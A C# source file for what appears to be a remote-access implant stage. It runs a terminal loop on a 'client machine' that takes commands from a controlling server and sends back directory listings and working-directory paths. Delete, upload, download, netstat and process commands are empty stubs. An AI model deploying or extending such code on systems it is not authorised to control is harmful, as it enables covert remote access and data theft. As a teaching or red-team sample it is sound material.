using System;
using System.IO;
using System.Text;
using Reno.Comm;

namespace Reno.Stages
{
    public class Terminal
    {
        CommChannel channel;
        string pwd = ".";

        /// <summary>
        /// Constructor for the Terminal program to be placed on the client machine
        /// </summary>
        /// <param name="channel">Communications channel to the server</param>
        public Terminal(CommChannel channel)
        {
            this.channel = channel;
        }
        /// <summary>
        /// Main loop for the terminal. Loop continues to listen to commands from the server until told to disconnect
        /// </summary>
        public void Execute()
        {
            bool run = true;
            while (run)
            {
                // Wait for a header - once its received execute the command
                CommHeader header = channel.ReceiveHeader();
                switch (header.Command)
                {
                    case CommChannel.EXIT:
                        run = false;
                        break;
                    case CommChannel.LS:
                        if (header.DataLength == 0)
                        {
                            SendDirectoryListing(pwd, header);
                        }
                        else
                        {
                            byte[] dirBytes = channel.ReceiveBytes(header.DataLength);
                            string sDir = Encoding.UTF8.GetString(channel.Decompress(dirBytes));
                            SendDirectoryListing(sDir, header);
                        }
                        break;
                    case CommChannel.PWD:
                        SendPresentWorkingDirectory(header);
                        break;
                    case CommChannel.CD:
                        if(header.DataLength == 0)
                        {
                            pwd = "C:\\";
                            SendChangeDirectory(pwd, header);
                        }
                        else
                        {
                            byte[] dirBytes = channel.ReceiveBytes(header.DataLength);
                            string tmpDir = Encoding.UTF8.GetString(channel.Decompress(dirBytes));
                            SendChangeDirectory(tmpDir, header);
                        }
                        break;
                    case CommChannel.DELETE:
                        break;
                    case CommChannel.UPLOAD:
                        break;
                    case CommChannel.DOWNLOAD:
                        break;
                    case CommChannel.NETSTAT:
                        break;
                    case CommChannel.PS:
                        break;
                }
            }
        }
        /// <summary>
        /// Helper function to print out the directory listing
        /// </summary>
        /// <param name="directory">String of the directory to print out</param>
        /// <param name="header">The CommHeader that was sent from the server</param>
        private void SendDirectoryListing(string directory, CommHeader header)
        {
            string output = "";
            if (Directory.Exists(directory))
            {
                DirectoryInfo dir = new DirectoryInfo(directory);
                Console.WriteLine("Directory {0}", dir.FullName);
                output += dir.FullName + "\n";

                foreach (DirectoryInfo i in dir.EnumerateDirectories())
                {
                    output += i.FullName + "\n";
                }
                foreach (string file in Directory.EnumerateFiles(directory))
                {
                    output += file + "\n";
                }
                Console.WriteLine(output);
                byte[] bytes = channel.Compress(Encoding.UTF8.GetBytes(output));
                CommHeader h = CreateHeader(header.Command, header.Compression, CommChannel.RESPONSE, header.Id, bytes.Length);
                channel.SendHeader(h);
                channel.SendBytes(bytes);
            }
        }
        /// <summary>
        /// Helper function to print out the present working directory
        /// </summary>
        /// <param name="header">The CommHeader that was sent from the server</param>
        private void SendPresentWorkingDirectory(CommHeader header)
        {
            DirectoryInfo pwdInfo = new DirectoryInfo(pwd);
            byte[] msg = channel.Compress(Encoding.UTF8.GetBytes(pwdInfo.FullName));
            CommHeader pwdHeader = CreateHeader(header.Command, header.Compression, CommChannel.RESPONSE, header.Id, msg.Length);
            Console.WriteLine("[*] Sending {0}", pwdInfo.FullName);
            channel.SendHeader(pwdHeader);
            channel.SendBytes(msg);
        }
        /// <summary>
        /// Helper function to change the current working directory
        /// </summary>
        /// <param name="directory">String of the directory to change to</param>
        /// <param name="header">The CommHeader that was sent from the server</param>
        private void SendChangeDirectory(string directory, CommHeader header)
        {
            if (Directory.Exists(directory))
            {
                pwd = directory;
            }
            byte[] bytes = channel.Compress(Encoding.UTF8.GetBytes(pwd));
            CommHeader cdHeader = CreateHeader(header.Command, header.Compression, CommChannel.RESPONSE, header.Id, bytes.Length);
            channel.SendHeader(cdHeader);
            channel.SendBytes(bytes);
        }

        /// <summary>
        /// Creates a new CommHeader for transmission
        /// </summary>
        /// <param name="command">Command to execute</param>
        /// <param name="compression">Compression method that is used</param>
        /// <param name="type">Type of message: Command or Response</param>
        /// <param name="id">Message Id</param>
        /// <param name="data_length">Length of data</param>
        /// <returns></returns>
        private CommHeader CreateHeader(byte command, byte compression, byte type, int id, int data_length)
        {
            return new CommHeader(command, compression, type, 0, id, data_length);
        }
    }
}
